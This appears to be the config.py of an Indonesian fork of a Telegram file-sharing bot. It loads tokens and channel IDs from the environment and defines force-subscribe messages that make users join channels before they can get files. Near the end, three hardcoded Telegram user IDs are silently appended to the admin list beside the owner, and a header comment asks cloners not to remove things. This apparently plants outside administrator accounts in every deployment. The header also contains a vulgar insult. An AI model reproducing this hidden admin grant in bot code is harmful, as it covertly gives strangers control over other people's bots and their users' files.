# (©)Codexbotz
# Recife By Zaen @Papi_Sanzu
# Kalo clone Gak usah hapus 
# gue tandain akun tele nya ngentod


import logging
import os
from logging.handlers import RotatingFileHandler

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "@Papi_Sanzu")

# Database
DB_URI = os.environ.get("DATABASE_URL", "")

# Username CH & Group
CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
GROUP = os.environ.get("GROUP", "SharingUserbot")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "0"))
FORCE_SUB_GROUP1 = int(os.environ.get("FORCE_SUB_GROUP1", "0"))

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))


TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>𝙃𝙖𝙡𝙡𝙤 𝙎𝙖𝙮𝙖𝙣𝙜👋❤ {first}</b>\n\n<b>𝙎𝙖𝙮𝙖 𝙙𝙖𝙥𝙖𝙩 𝙢𝙚𝙣𝙮𝙞𝙢𝙥𝙖𝙣 𝙛𝙞𝙡𝙚 𝙥𝙧𝙞𝙗𝙖𝙙𝙞 𝙙𝙞 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙏𝙚𝙧𝙩𝙚𝙣𝙩𝙪 𝙙𝙖𝙣 𝙥𝙚𝙣𝙜𝙜𝙪𝙣𝙖 𝙡𝙖𝙞𝙣 𝙙𝙖𝙥𝙖𝙩 𝙢𝙚𝙣𝙜𝙖𝙠𝙨𝙚𝙨𝙣𝙮𝙖 𝙙𝙖𝙧𝙞 𝙡𝙞𝙣𝙠 𝙠𝙝𝙪𝙨𝙪𝙨.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>𝙃𝙖𝙡𝙡𝙤 𝙎𝙖𝙮𝙖𝙣𝙜👋😚 {first}\n\n𝙆𝙡𝙞𝙠 𝙅𝙤𝙞𝙣 𝙏𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝘿𝙖𝙝𝙪𝙡𝙪, 𝙎𝙪𝙥𝙖𝙮𝙖 𝙆𝙖𝙢𝙪 𝙈𝙚𝙣𝙙𝙖𝙥𝙖𝙩𝙠𝙖𝙣 𝙑𝙞𝙙𝙚𝙤 𝘼𝙩𝙖𝙪 𝙁𝙞𝙡𝙚𝙣𝙮𝙖\n\n❤𝙅𝙊𝙄𝙉 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙎𝘼𝙔𝘼𝙉𝙂𝙆𝙐❤</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)
ADMINS.append(844432220)
ADMINS.append(1750080384)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
